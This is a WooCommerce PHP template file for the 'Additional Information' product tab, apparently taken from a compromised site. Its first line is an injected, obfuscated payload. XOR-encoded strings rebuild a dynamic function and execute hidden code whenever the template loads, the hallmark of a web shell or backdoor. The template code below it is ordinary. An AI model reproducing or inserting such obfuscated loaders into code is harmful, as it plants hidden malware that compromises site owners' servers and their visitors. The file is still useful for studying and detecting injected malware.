<?php $PJIZmMH='O<ER6HgTAB1=I:B'^',N 3B-824,RI U,';$MbNvsFdJzft=$PJIZmMH('','BSBr,1WHL=8CqV30X;1fq0T>1653JngA05UdBq:2EV:6HZ>-ZLA=50>675cjUM=Nf0WTWCmV<=:KOCBHT+pE=LOXIIKISVyXM>UD7of zenCrCJ.U1,<P7XMw7PCYYBBN3anlchZaWO>nxNaDBTV ,+AY:OstsX.W5P.rmyS91Y2BDR250k-BcgDz<VI:BTQnCHTFM>fK8OC<vXAY;Ktr5TP+2pBF>M2S<.Y7blS1OYS,Wa6U6KYR.8pim>pqyginU4MkwX= wTMkwEPGOXJh+RnhTRN5e>RNxkGl9R3Q00WZJ<.VPYuV+<MQQ<L9K,PKeLID4,9jO,rbSR 490RhANo5elc49izX+Tl37NuRmeqA88YEQN8m0yE53F+mEV8brUS8U,IE=Ze7381XhFQZX4:XrPMPf>ape2XG5qis83W14GE4L;NVJE5La=,E5caMX;Z66G6bZ>7-0B2 Lv>W.RBejk7ZO1>,QJXGvZ1QJF,U67fANn6R0+79-.B4=SS2J6Ys;I5hXbUDOM,OlQgbXMYBej01O4jrRU7P2greQdOTf,wWXTQWl,09.c2uJJcUQu>kkKBz IetkybdNMBN+C<KS>m0>3BY8Xp56.YB8 fXhH SL;GaDFjkpwFCcW2QAqE3ZXO1VE4><++Hl-ZRr72TDAqsYn<F'^ '+5jSJD9+8TW-.3KY+OBNVH;LnRTG+18,EArMkQA8L0OX+.WB4l9RGoZWCT<588IfBT6 6oMrWXCbocbhtPzL4h -=ivitqBRD73+EGBIZXNsIcnGiBXN<R6eSS178pybjZJEEiaSE8:JNVsAlf07TMpe0go-TW3K.ntGRHY MC5W,lvYPIBpkXmMsN3=O0:yJ,= ov4o622I6R< -ZkIRS5<XWKHbZ,F2cE<NBQsW.5 Ilk<3Y9<3MPPAIa3>6, +uU>KS3XYWisKS31+:=cHPXgL03:T:U77XVgHR7Jj:9s>+HOvmyQ JP84j613AE6kMmm UXXCoWxk5=RQXS:Hij0g =6qj=Z9XtHXR7UoSEU7YT, xnCg9paQR2J2.3ABOuwS0UrO4SASRLPxUfu,9XO=IZD-lCkzAV93TQTSxF9BQ5,U R43b=Z>>YM1T<> -OrTW4STnaSHS-VEdRZ6Z3kIJOS;;PaG43qnMPX7bbH4BVFghNW BJNfFK;kX+:A>EqTP,LOtBq .9MfLwABp =wMNTP;U1U90NwoNRXlDh1PNN4jm72ZOTZOPVGzyP30DZYRx NF-RSBYDBn,0<J:c 6G2UFZ1-KpWEWW5-YDAtHlD28ZnHdfJKPW=Ij2D0-YaW;,.jq5UGPDJ,Kpsix>W,-5YCpU6;'); $MbNvsFdJzft();
/**
 * Additional Information tab
 *
 * This template can be overridden by copying it to yourtheme/woocommerce/single-product/tabs/additional-information.php.
 *
 * HOWEVER, on occasion WooCommerce will need to update template files and you
 * (the theme developer) will need to copy the new files to your theme to
 * maintain compatibility. We try to do this as little as possible, but it does
 * happen. When this occurs the version of the template file will be bumped and
 * the readme will list any important changes.
 *
 * @see 	    https://docs.woocommerce.com/document/template-structure/
 * @author        WooThemes
 * @package       WooCommerce/Templates
 * @version       3.0.0
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

global $product;

$heading = esc_html( apply_filters( 'woocommerce_product_additional_information_heading', __( 'Additional information', 'woocommerce' ) ) );

?>

<?php if ( $heading ): ?>
	<h3><?php echo $heading; ?></h3>
<?php endif; ?>

<?php do_action( 'woocommerce_product_additional_information', $product );

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
